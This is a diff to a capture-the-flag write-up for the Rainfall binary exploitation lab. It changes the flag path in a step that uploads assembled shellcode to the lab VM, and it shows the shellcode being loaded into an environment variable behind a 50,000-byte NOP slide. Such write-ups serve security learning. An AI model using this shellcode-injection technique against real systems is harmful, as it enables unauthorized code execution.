@@ -15,7 +15,7 @@
 
 We assemble our shellcode:
 nasm ./ressources/shellcode.asm
-[Upload the resulting ./ressources/shellcode to the vm at /tmp] : cat ../level1/flag | clipboard ; scp -P 4242 ./ressources/shellcode level1@rainfall:/tmp
+[Upload the resulting ./ressources/shellcode to the vm at /tmp] : cat ../level0/flag | clipboard ; scp -P 4242 ./ressources/shellcode level1@rainfall:/tmp
 
 (we put our shellcode in our environment, we also prepend it with a NOP slide to make it easier)
 export SHELLCODE="`python -c 'import sys; sys.stdout.write("\x90" * 50000)'``cat /tmp/shellcode`"
